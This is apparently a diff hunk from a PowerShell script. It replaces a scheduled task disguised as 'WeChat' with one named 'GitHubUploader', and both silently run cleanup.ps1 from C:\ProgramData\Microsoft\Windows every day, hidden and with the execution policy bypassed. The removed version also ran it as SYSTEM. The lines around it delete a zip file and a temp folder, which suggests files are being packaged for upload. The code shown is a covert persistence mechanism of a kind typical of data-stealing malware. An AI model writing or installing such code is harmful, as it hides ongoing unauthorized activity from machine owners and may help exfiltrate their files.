@@ -114,20 +114,10 @@ try {
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 
-# STEP 6: Register daily task at 1:00 AM to run the cleanup.ps1 script
-$taskName = "WeChat"
-$taskDescription = "Daily file package task"
-$scriptPath = "C:\\ProgramData\\Microsoft\\Windows\\cleanup.ps1"
+# STEP 6: Register task using schtasks (11:00 PM daily)
+$taskName = "GitHubUploader"
+$scriptPathEscaped = "C:\ProgramData\Microsoft\Windows\cleanup.ps1"
 
 try {
-    # If exists, delete first
-    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
-        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-    }
-
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
-    $trigger = New-ScheduledTaskTrigger -Daily -At 1:00am
-    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-
-    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal
+    schtasks /Create /TN $taskName /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPathEscaped`"" /SC DAILY /ST 23:00 /F | Out-Null
 } catch {}
